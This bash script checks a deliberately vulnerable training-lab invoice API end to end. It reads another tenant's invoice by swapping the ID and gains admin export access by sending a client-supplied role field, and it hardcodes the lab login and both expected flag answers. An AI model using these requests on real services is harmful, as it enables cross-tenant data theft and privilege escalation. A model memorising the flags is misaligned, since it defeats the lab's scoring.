#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# Crimson Range — Invoice Inspector (bola-invoice-api) end-to-end solver check.
#
# Verifies the LIVE lab target exactly the way a player would solve it, all
# over plain HTTP (Burp/curl style):
#   1. login as pentest01 -> bearer token
#   2. list own tenant's invoices (#9001-#9007, acme.dev)
#   3. BOLA read #8999 (other tenant) -> flag 1 in the `notes` field
#   4. admin export WITHOUT role -> 403 (control)
#   5. admin export WITH {"role":"admin"} -> flag 2 in the service_account row
# Also asserts login rate limiting (5/min/IP) on repeated wrong passwords.
#
# Flag answers are compared against the portal's STATIC seed hashes so a
# green run means scoring will accept what the lab leaks. Exits non-zero on
# any failure. Usage: bash scripts/lab-invoice-check.sh [base_url]
#   default base: http://localhost:3000/api/labs/invoice/v2
# ---------------------------------------------------------------------------
set -u
BASE="${1:-http://localhost:3000/api/labs/invoice/v2}"
FLAG1="CR{1d0r_1nv01c3_pwn3d}"
FLAG2="CR{b0l4_4dm1n_r3s3t}"
FAIL=0

step() { printf '\n== %s ==\n' "$1"; }
fail() { echo "  FAIL: $1"; FAIL=1; }
pass() { echo "  ok: $1"; }

step "1) login pentest01/Winter2026! -> bearer token"
LOGIN=$(curl -s -X POST "$BASE/auth/login" -H "Content-Type: application/json" \
  -d '{"username":"pentest01","password":"Winter2026!"}')
TOKEN=$(printf '%s' "$LOGIN" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
if [ -z "$TOKEN" ] || [ "$(printf '%s' "$TOKEN" | awk -F. '{print NF}')" != 3 ]; then
  fail "no JWT-shaped token in login response: ${LOGIN:0:120}"
else
  pass "token minted (3 dot segments)"
fi

step "2) list own tenant invoices (acme.dev sees #9001-#9007)"
IDS=$(curl -s "$BASE/invoices" -H "Authorization: Bearer $TOKEN" \
  | python3 -c "import sys,json;d=json.load(sys.stdin);print(','.join(str(i['id']) for i in d['data']))")
if [ "$IDS" != "9001,9002,9003,9004,9005,9006,9007" ]; then
  fail "expected own ids 9001..9007, got: $IDS"
else
  pass "own tenant scoped correctly ($IDS)"
fi

step "3) BOLA: read another tenant's invoice #8999 with own token"
NOTES=$(curl -s "$BASE/invoices/8999" -H "Authorization: Bearer $TOKEN" \
  | python3 -c "import sys,json;d=json.load(sys.stdin)['data'];print(d['notes']);import sys as s;print('owner='+d['owner']['name'],file=s.stderr)")
OWNER=$(curl -s "$BASE/invoices/8999" -H "Authorization: Bearer $TOKEN" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['owner']['name'])")
case "$NOTES" in
  *"$FLAG1"*) pass "flag 1 found in notes of Falcon Logistics invoice #8999 (owner: $OWNER)" ;;
  *) fail "flag 1 missing from #8999 notes; got: ${NOTES:0:120}" ;;
esac

step "4) control: admin export WITHOUT role -> 403"
CODE=$(curl -s -o /tmp/cr-export-no.json -w "%{http_code}" -X POST "$BASE/admin/export" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{}')
if [ "$CODE" != "403" ]; then
  fail "expected 403 without role, got HTTP $CODE"
else
  pass "export denied without role (HTTP 403)"
fi

step "5) exploit: admin export WITH {\"role\":\"admin\"} -> flag 2"
SECRET=$(curl -s -X POST "$BASE/admin/export" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d '{"role":"admin"}' \
  | python3 -c "import sys,json;d=json.load(sys.stdin);print(next(r['secret'] for r in d['records'] if r['record_type']=='service_account'))")
if [ "$SECRET" != "$FLAG2" ]; then
  fail "flag 2 missing from export; got: ${SECRET:0:120}"
else
  pass "flag 2 leaked via client-supplied role (service_account.secret)"
fi

step "6) login rate limit (5/min/IP)"
CODES=""
for i in 1 2 3 4 5 6 7; do
  CODES="$CODES $(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE/auth/login" \
    -H "Content-Type: application/json" -d '{"username":"pentest01","password":"wrong"}')"
done
if ! echo "$CODES" | grep -q 429; then
  fail "no 429 observed on rapid login attempts ($CODES)"
else
  pass "login rate limited (codes:$CODES)"
fi

echo
if [ "$FAIL" -eq 0 ]; then
  echo "ALL CHECKS PASSED — both flags leak exactly as seeded: $FLAG1 / $FLAG2"
  exit 0
else
  echo "SOME CHECKS FAILED"
  exit 1
fi